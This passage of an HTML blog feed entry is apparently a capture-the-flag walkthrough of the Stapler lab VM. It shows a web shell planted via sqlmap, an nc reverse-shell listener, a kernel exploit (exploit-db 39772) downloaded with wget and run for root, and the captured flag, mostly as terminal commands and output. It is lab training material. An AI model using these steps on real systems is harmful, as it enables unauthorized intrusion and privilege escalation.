</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the <span class="nb">local </span>file <span class="p">&amp;</span>lsquo<span class="p">;</span>rsh.php<span class="p">&amp;</span>rsquo<span class="p">;</span> and the remote file <span class="p">&amp;</span>lsquo<span class="p">;</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php<span class="p">&amp;</span>rsquo<span class="p">;</span> have the same size <span class="o">(</span><span class="m">5495</span> B<span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;/em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfilehex<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 closed
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! looks like the web shell uploaded successfully.</p>

<p>Now got in and time to get ROOT.</p>

<p>Set up <code>nc</code> to listen on local port <code>443</code> and then trigger the shell to connect back by accessing the web shell page on <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/rsh.php</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.138<span class="o">]</span> 37668
</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 16:08:13 up <span class="m">1</span> day,  1:59,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>uname -a
</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After enumeration, I know the target machine is running Linux Kernel 4.4.0, so by using <code>searchsploit</code> to search any existed vulnerability to against the target machine, and lucky I found one Local Root Exploit which is <a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit"><code>Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit</code></a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&quot;</span>&gt;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&lt;/a&gt;
</span><span class='line'><span class="p">&amp;</span>ndash<span class="p">;</span>2016-08-13 20:17:02<span class="p">&amp;</span>ndash<span class="p">;</span>  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&quot;</span>&gt;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&lt;/a&gt;
</span><span class='line'>Resolving github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">&amp;</span>hellip<span class="p">;</span> 192.30.253.113
</span><span class='line'>Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">|</span>192.30.253.113<span class="p">|</span>:443<span class="p">&amp;</span>hellip<span class="p">;</span> connected.
</span><span class='line'>HTTP request sent, awaiting response<span class="p">&amp;</span>hellip<span class="p">;</span> <span class="m">302</span> Found
</span><span class='line'>Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&quot;</span>&gt;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&lt;/a&gt; <span class="o">[</span>following<span class="o">]</span>
</span><span class='line'><span class="p">&amp;</span>ndash<span class="p">;</span>2016-08-13 20:17:03<span class="p">&amp;</span>ndash<span class="p">;</span>  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&quot;</span>&gt;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&lt;/a&gt;
</span><span class='line'>Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">&amp;</span>hellip<span class="p">;</span> 151.101.100.133
</span><span class='line'>Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">|</span>151.101.100.133<span class="p">|</span>:443<span class="p">&amp;</span>hellip<span class="p">;</span> connected.
</span><span class='line'>HTTP request sent, awaiting response<span class="p">&amp;</span>hellip<span class="p">;</span> <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">7115</span> <span class="o">(</span>6.9K<span class="o">)</span> <span class="o">[</span>application/zip<span class="o">]</span>
</span><span class='line'>Saving to: <span class="p">&amp;</span>lsquo<span class="p">;</span>39772.zip<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt; 0K ......                                                100% 14.5M<span class="o">=</span>0s
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;2016-08-13 20:17:03 <span class="o">(</span>14.5 MB/s<span class="o">)</span> - <span class="p">&amp;</span>lsquo<span class="p">;</span>39772.zip<span class="p">&amp;</span>rsquo<span class="p">;</span> saved <span class="o">[</span>7115/7115<span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>unzip 39772.zip
</span><span class='line'>Archive:  39772.zip
</span><span class='line'>   creating: 39772/
</span><span class='line'>  inflating: 39772/.DS_Store       &lt;br/&gt;
</span><span class='line'>   creating: &lt;strong&gt;MACOSX/
</span><span class='line'>   creating: &lt;/strong&gt;MACOSX/39772/
</span><span class='line'>  inflating: &lt;strong&gt;MACOSX/39772/._.DS_Store&lt;br/&gt;
</span><span class='line'>  inflating: 39772/crasher.tar     &lt;br/&gt;
</span><span class='line'>  inflating: &lt;/strong&gt;MACOSX/39772/.&lt;em&gt;crasher.tar&lt;br/&gt;
</span><span class='line'>  inflating: 39772/exploit.tar     &lt;br/&gt;
</span><span class='line'>  inflating: __MACOSX/39772/.&lt;/em&gt;exploit.tar&lt;br/&gt;
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>39772
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>crasher.tar
</span><span class='line'>exploit.tar
</span><span class='line'><span class="nv">$ </span>tar vxf exploit.tar
</span><span class='line'>ebpf_mapfd_doubleput_exploit/
</span><span class='line'>ebpf_mapfd_doubleput_exploit/hello.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/suidhelper.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/compile.sh
</span><span class='line'>ebpf_mapfd_doubleput_exploit/doubleput.c
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>ebpf_mapfd_doubleput_exploit
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>compile.sh
</span><span class='line'>doubleput.c
</span><span class='line'>hello.c
</span><span class='line'>suidhelper.c
</span><span class='line'><span class="nv">$ </span>./compile.sh
</span><span class='line'>doubleput.c: In <span class="k">function</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>make_setuid<span class="p">&amp;</span>rsquo<span class="p">;</span>:
</span><span class='line'>doubleput.c:91:13: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .insns <span class="o">=</span> <span class="o">(</span>&lt;strong&gt;aligned_u64<span class="o">)</span> insns,
</span><span class='line'>             ^
</span><span class='line'>doubleput.c:92:15: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .license <span class="o">=</span> <span class="o">(</span>&lt;/strong&gt;aligned_u64<span class="o">)</span><span class="p">&amp;</span>ldquo<span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>               ^
</span><span class='line'><span class="nv">$ </span>ls -la
</span><span class='line'>total 60
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:18 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:17 ..
</span><span class='line'>-rwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">1</span> www-data www-data   <span class="m">155</span> Apr <span class="m">25</span> 23:25 compile.sh
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data <span class="m">12332</span> Aug <span class="m">13</span> 20:18 doubleput
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> www-data www-data  <span class="m">4188</span> Apr <span class="m">25</span> 23:25 doubleput.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">8024</span> Aug <span class="m">13</span> 20:18 hello
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> www-data www-data  <span class="m">2186</span> Apr <span class="m">25</span> 23:25 hello.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">7520</span> Aug <span class="m">13</span> 20:18 suidhelper
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> www-data www-data   <span class="m">255</span> Apr <span class="m">25</span> 23:25 suidhelper.c
</span><span class='line'><span class="nv">$ </span>./doubleput
</span><span class='line'>starting writev
</span><span class='line'>woohoo, got pointer reuse
</span><span class='line'>id
</span><span class='line'>writev returned successfully. <span class="k">if</span> this worked, you<span class="p">&amp;</span>rsquo<span class="p">;</span>ll have a root shell in <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span><span class="m">60</span> seconds.
</span><span class='line'>suid file detected, launching rootshell<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>we have root privs now<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>python -c <span class="p">&amp;</span>ldquo<span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit#
</span></code></pre></td></tr></table></div></figure></p>

<p>Brilliant! we now got ROOT and caught the flag file under directory <code>/root/</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@red:/root# ls
</span><span class='line'>ls
</span><span class='line'>fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
</span><span class='line'>root@red:/root# cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>&lt;del&gt;<span class="p">&amp;</span>lt<span class="p">;</span><span class="o">(</span>Congratulations<span class="o">)</span>&gt;&lt;/del&gt;
</span><span class='line'>                          .-<span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;&amp;</span>lsquo<span class="p">;</span>-.
</span><span class='line'>                          <span class="p">|&amp;</span>rsquo<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;&amp;</span>lsquo<span class="p">;|</span>
</span><span class='line'>                          <span class="p">|</span>-<span class="p">&amp;</span>hellip<span class="p">;</span>..-<span class="p">|</span>
</span><span class='line'>                          <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'>                          <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'>         &lt;em&gt;,.&lt;/em&gt;             <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'>    __.o&lt;code&gt;  o&lt;/code&gt;<span class="p">&amp;</span>ldquo<span class="p">;</span>-.         <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'> .-O o &lt;code&gt;<span class="s2">&quot;-.o   O )_,._    |       |</span>
</span><span class='line'><span class="s2">( o   O  o )--.-&quot;</span>&lt;/code&gt;O   o<span class="p">&amp;</span>rdquo<span class="p">;</span>-.&lt;code&gt;<span class="s1">&#39;-----&#39;</span>&lt;/code&gt;
</span><span class='line'> <span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;&amp;</span>lsquo<span class="p">;</span>  <span class="o">(</span>   o  O    o<span class="o">)</span>&lt;br/&gt;
</span><span class='line'>              &lt;code&gt;----------&lt;/code&gt;
</span><span class='line'>b6b545dc11b7a270f4bad23432190c75162c4a2b&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@red:/root#
</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
</feed>
